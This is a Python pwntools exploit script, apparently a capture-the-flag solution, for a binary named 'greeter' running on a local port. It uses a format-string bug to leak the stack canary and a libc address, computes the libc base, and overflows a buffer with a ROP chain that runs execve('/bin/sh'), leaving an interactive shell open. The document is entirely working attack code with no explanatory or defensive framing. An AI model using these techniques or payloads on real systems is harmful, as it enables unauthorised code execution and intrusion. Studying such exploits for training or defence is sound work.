#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template greeter
from pwn import *
from struct import pack

# Set up pwntools for the correct architecture
exe = context.binary = ELF('greeter')
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

host = args.HOST or 'localhost'
port = int(args.PORT or 30000)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
entry
nextcall
nextcall
nextcall
tbreak *$rdi
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

env = {"LD_PRELOAD": "./libc.so.6"}
io = start()

# %17$p - __libc_start_main+243
# %15$p - canary

fmt = b"%17$p.%15$p.\n" # leak __libc_start_main+243 i kanarka

io.recvuntil(b'Name?\n')
io.send(fmt)
leaked = io.recvuntil(b'welcome!\n').split(b'.')

print(leaked)
libc_start_main_243 = int(leaked[0][2:], 16)
canary = int(leaked[1][2:], 16)

print(f"libc_start_main+243 = {hex(libc_start_main_243)}")
print(f"canary = {hex(canary)}")

libc_start_main_243_offset = 138135
libc_base_addr = libc_start_main_243 - libc_start_main_243_offset
print(f"libc base addr = {hex(libc_base_addr)}")

input("enter to continue")

io.recvuntil(b'language?')

# ropper -f libc.so.6 --chain "execve cmd=/bin/sh --badbytes=20090a0d0b0c"

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = libc_base_addr # cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000021a45) # 0x0000000000021a45: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x000000000002155f) # 0x000000000002155f: pop rdi; ret; 
rop += rebase_0(0x00000000003eb1a0)
rop += rebase_0(0x0000000000064189) # 0x0000000000064189: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000021a45) # 0x0000000000021a45: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000002155f) # 0x000000000002155f: pop rdi; ret; 
rop += rebase_0(0x00000000003eb1a8)
rop += rebase_0(0x0000000000064189) # 0x0000000000064189: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002155f) # 0x000000000002155f: pop rdi; ret; 
rop += rebase_0(0x00000000003eb1a0)
rop += rebase_0(0x0000000000023e6a) # 0x0000000000023e6a: pop rsi; ret; 
rop += rebase_0(0x00000000003eb1a8)
rop += rebase_0(0x0000000000001b96) # 0x0000000000001b96: pop rdx; ret; 
rop += rebase_0(0x00000000003eb1a8)
rop += rebase_0(0x00000000000439c8) # 0x00000000000439c8: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000d2975) # 0x00000000000d2975: syscall; ret;

io.sendline(72*b'a' + p64(canary) + 8*b'b' +  rop) # sending ROP payload
io.interactive()
